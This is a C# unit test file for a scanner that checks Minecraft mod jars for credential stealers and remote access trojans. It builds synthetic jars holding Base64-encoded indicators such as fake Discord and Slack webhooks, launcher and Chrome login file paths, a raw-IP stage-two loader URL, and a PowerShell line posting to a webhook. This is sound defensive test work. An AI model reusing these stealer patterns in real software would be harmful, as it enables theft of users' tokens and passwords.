using System.IO.Compression;
using System.Text;
using HistoryParser.Core.Models;
using RatChecker.Core;

namespace HistoryParser.Core.Tests;

/// <summary>
/// The RAT Checker against synthetic jars: stealer patterns must be caught, and the things ordinary mods do
/// (log in to Mojang, use HTTP, ship the public-suffix list) must not be called dangerous.
/// The fake indicators are Base64 here for the same reason as in Indicators.cs: antivirus scans the test DLL too.
/// Everything is scanned in memory: fake jars written to Temp and deleted again look exactly like a cheat cleaning up,
/// and Log Parser rightly flagged them on the developer's PC.
/// </summary>
public class RatTests
{
    static string B(string b64) => Encoding.UTF8.GetString(Convert.FromBase64String(b64));
    static readonly string Webhook = B("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5MDEyMzQ1Njc4L2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5Xy1hYmNk"); // full webhook (fake id/token)
    static readonly string WebhookPrefix = B("ZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLw=="); // discord.com/api/webhooks/
    static readonly string LauncherAccounts = B("QzpcVXNlcnNceFxBcHBEYXRhXFJvYW1pbmdcLm1pbmVjcmFmdFxsYXVuY2hlcl9hY2NvdW50c19taWNyb3NvZnRfc3RvcmUuanNvbg==");
    static readonly string RawIpUrl = B("aHR0cDovLzIwMy4wLjExMy41MDo4MDgwL3N0YWdlMg=="); // http://203.0.113.50:8080/stage2 (TEST-NET-3)
    static readonly string FractureiserIp = B("ODUuMjE3LjE0NC4xMzA=");
    static readonly string Session = B("bmV0L21pbmVjcmFmdC9jbGFzc18zMjA="); // net/minecraft/class_320
    static readonly string GetAccessToken = B("bWV0aG9kXzE2NzQ=");
    static readonly string UrlClassLoader = B("amF2YS9uZXQvVVJMQ2xhc3NMb2FkZXI=");
    static readonly string ChromePasswords = B("QzpcVXNlcnNceFxBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==");

    /// <summary>A minimal class file: just a constant pool with string literals and method references.</summary>
    static byte[] Class(string[] literals, (string Owner, string Name)[] calls)
    {
        var pool = new List<byte[]>();
        int Utf8(string s) { var b = Encoding.UTF8.GetBytes(s); pool.Add([1, (byte)(b.Length >> 8), (byte)b.Length, .. b]); return pool.Count; }
        int Ref(byte tag, int a, int b) { pool.Add([tag, (byte)(a >> 8), (byte)a, (byte)(b >> 8), (byte)b]); return pool.Count; }
        int Short(byte tag, int a) { pool.Add([tag, (byte)(a >> 8), (byte)a]); return pool.Count; }
        foreach (var s in literals) Short(8, Utf8(s));
        foreach (var (owner, name) in calls)
        {
            int cls = Short(7, Utf8(owner));
            int nat = Ref(12, Utf8(name), Utf8("()V"));
            Ref(10, cls, nat);
        }
        var ms = new MemoryStream();
        ms.Write([0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 61]);
        int count = pool.Count + 1;
        ms.Write([(byte)(count >> 8), (byte)count]);
        foreach (var e in pool) ms.Write(e);
        ms.Write(new byte[10]); // access, this, super, interfaces, fields... (not read)
        return ms.ToArray();
    }

    static byte[] Zip(params (string Name, byte[] Data)[] entries)
    {
        var ms = new MemoryStream();
        using (var zip = new ZipArchive(ms, ZipArchiveMode.Create, leaveOpen: true))
            foreach (var (name, data) in entries)
            {
                using var s = zip.CreateEntry(name).Open();
                s.Write(data);
            }
        return ms.ToArray();
    }

    static readonly byte[] FabricMod = Encoding.UTF8.GetBytes("{\"schemaVersion\":1,\"id\":\"coolmod\",\"name\":\"Cool Mod\",\"version\":\"1.2.3\"}");

    static RatFileReport ScanJar(params (string Name, byte[] Data)[] entries) => RatScanner.Scan("test.jar", Zip(entries));

    [Fact]
    public void Hardcoded_webhook_is_dangerous()
    {
        var r = ScanJar(("fabric.mod.json", FabricMod), ("a/B.class", Class([Webhook], [])));
        Assert.Equal(RatVerdict.Dangerous, r.Verdict);
        Assert.Contains(r.Signs, s => s.Category == RatCategory.Exfiltration && s.Severity == Severity.High && s.Where == "a/B.class");
        Assert.Equal("Cool Mod 1.2.3 (Fabric)", r.ModInfo);
    }

    [Fact]
    public void Token_plus_hidden_webhook_is_dangerous()
    {
        // The classic Fabric stealer: read Session.getAccessToken, post it to a webhook whose address is Base64.
        string hidden = Convert.ToBase64String(Encoding.UTF8.GetBytes("https://" + WebhookPrefix + "x"));
        var r = ScanJar(("a/S.class", Class([hidden], [(Session, GetAccessToken), ("java/net/HttpURLConnection", "connect")])));
        Assert.Equal(RatVerdict.Dangerous, r.Verdict);
        Assert.Contains(r.Signs, s => s.Title == "Collects private data and can send it out");
        Assert.Contains(r.Signs, s => s.Where.EndsWith("(hidden as Base64)"));
    }

    [Fact]
    public void Launcher_account_file_and_browser_passwords_are_dangerous()
    {
        // A mod reading another launcher's logins is a stealer; a launcher or client (no mod metadata) importing them is a lead.
        Assert.Equal(RatVerdict.Dangerous, ScanJar(("fabric.mod.json", FabricMod), ("a/A.class", Class([LauncherAccounts], []))).Verdict);
        Assert.Equal(RatVerdict.Suspicious, ScanJar(("a/A.class", Class([LauncherAccounts], []))).Verdict);
        Assert.Equal(RatVerdict.Dangerous, ScanJar(("a/C.class", Class([ChromePasswords], []))).Verdict);
    }

    [Fact]
    public void Class_loading_from_a_raw_ip_is_dangerous()
    {
        var r = ScanJar(("a/L.class", Class([RawIpUrl], [(UrlClassLoader, "<init>")])));
        Assert.Contains(r.Signs, s => s.Title == "Downloads code from an anonymous server and runs it");
        Assert.Equal(RatVerdict.Dangerous, r.Verdict);
    }

    [Fact]
    public void Known_malware_and_nested_jars_are_caught()
    {
        var inner = Zip(("x/Y.class", Class([FractureiserIp], [])));
        var r = ScanJar(("fabric.mod.json", FabricMod), ("META-INF/jars/lib.jar", inner));
        Assert.Equal(RatVerdict.Dangerous, r.Verdict);
        Assert.Contains(r.Signs, s => s.Category == RatCategory.KnownMalware && s.Where.Contains("lib.jar"));
    }

    [Fact]
    public void Embedded_program_is_flagged_even_when_renamed()
    {
        var pe = new byte[0x80]; pe[0] = (byte)'M'; pe[1] = (byte)'Z';
        var r = ScanJar(("assets/coolmod/icon.png", pe));
        Assert.Contains(r.Signs, s => s.Category == RatCategory.Embedded && s.Severity == Severity.Medium);
    }

    [Fact]
    public void Ordinary_mod_behaviour_is_not_flagged()
    {
        // Logs in to Mojang with the token, uses HTTP, loads classes, opens links, uploads crash logs to a paste
        // site, and ships an HTTP library's public-suffix list (which names every tunnel/upload domain).
        var r = ScanJar(
            ("fabric.mod.json", FabricMod),
            ("a/Auth.class", Class(["https://api.minecraftservices.com/minecraft/profile", "https://hastebin.com/documents"],
                [(Session, GetAccessToken), ("java/net/HttpURLConnection", "connect"), ("java/lang/ClassLoader", "defineClass"), ("java/lang/ProcessBuilder", "start")])),
            ("mozilla/public-suffix-list.txt", Encoding.UTF8.GetBytes("com\nngrok.io\ntrycloudflare.com\n")),
            ("DebugProbesKt.bin", Class([], [])));
        Assert.Equal(RatVerdict.Clean, r.Verdict);
        Assert.DoesNotContain(r.Signs, s => s.Severity >= Severity.Medium);
    }

    [Fact]
    public void Unreadable_and_text_files_are_handled()
    {
        var r = RatScanner.Scan("broken.jar", [(byte)'P', (byte)'K', 3, 4, 1, 2, 3, 4, 5, 6]);
        Assert.NotEqual(RatVerdict.Dangerous, r.Verdict);

        var script = Encoding.UTF8.GetBytes("Invoke-RestMethod -Uri '" + Webhook + "' -Method Post");
        Assert.Equal(RatVerdict.Dangerous, RatScanner.Scan("run.ps1", script).Verdict);
    }

    static readonly string SlackHook = B("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDBBQkNERUZHL0IwQUJDREVGRy9hYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3g="); // fake Slack webhook
    static readonly string BotToken = B("TVRJek5EVTJOemc1TURFeU16UTFOamM0T1RBeC5HYUJjRGUuYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIz"); // fake bot token

    [Fact]
    public void Slack_webhooks_and_bot_tokens_are_dangerous()
    {
        Assert.Equal(RatVerdict.Dangerous, ScanJar(("a/S.class", Class([SlackHook], []))).Verdict);
        var r = ScanJar(("a/T.class", Class([BotToken], [])));
        Assert.Equal(RatVerdict.Dangerous, r.Verdict);
        Assert.DoesNotContain(r.Signs, s => s.Evidence.Contains(BotToken)); // the key is shortened in reports
    }

    [Fact]
    public void Class_hidden_after_an_image_is_found_and_scanned()
    {
        // A real-looking PNG (signature + IEND chunk) with a class file appended - "copy /b icon.png + payload.class".
        byte[] png = [0x89, (byte)'P', (byte)'N', (byte)'G', 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0, (byte)'I', (byte)'E', (byte)'N', (byte)'D', 0xAE, 0x42, 0x60, 0x82];
        var hidden = Class([Webhook], []);
        var r = ScanJar(("assets/coolmod/icon.png", [.. png, .. hidden, .. new byte[80]]));
        Assert.Contains(r.Signs, s => s.Title == "File hidden inside an image" && s.Severity == Severity.High);
        Assert.Contains(r.Signs, s => s.Title == "Hard-coded Discord webhook"); // the hidden class itself was read
    }

    [Fact]
    public void Plain_images_and_keyauth_are_not_flagged()
    {
        byte[] png = [0x89, (byte)'P', (byte)'N', (byte)'G', 0x0D, 0x0A, 0x1A, 0x0A, .. new byte[500], (byte)'I', (byte)'E', (byte)'N', (byte)'D', 0xAE, 0x42, 0x60, 0x82];
        var r = ScanJar(("assets/coolmod/icon.png", png), ("a/K.class", Class(["https://keyauth.win/api/1.2/"], [])));
        Assert.Equal(RatVerdict.Clean, r.Verdict);
        Assert.Contains(r.Signs, s => s.Title == "Uses KeyAuth licensing" && s.Severity == Severity.Low);
    }

    [Fact]
    public void Launcher_folders_match_whole_path_parts_only()
    {
        Assert.True(RatScanner.IsPathPart(@"C:\Users\x\AppData\Roaming\PrismLauncher\accounts.json", "PrismLauncher"));
        Assert.True(RatScanner.IsPathPart("/home/x/.lunarclient/settings", ".lunarclient"));
        Assert.False(RatScanner.IsPathPart("vazkii/botania/common/block/BlockLightLauncher", "TLauncher"));
        Assert.False(RatScanner.IsPathPart("Open the TLauncher website", "TLauncher"));
    }

    [Fact]
    public void Indicators_decode()
    {
        // Every encoded value must decode, or a rule would silently never match.
        Assert.All(new[] { Ioc.DropHosts, Ioc.LauncherFolders, Ioc.LoginFiles, Ioc.LolBins, Ioc.Fractureiser, Ioc.NetworkRefs }, list => Assert.All(list, v => Assert.False(string.IsNullOrWhiteSpace(v))));
        Assert.Matches(Ioc.WebhookFull, Webhook);
    }
}
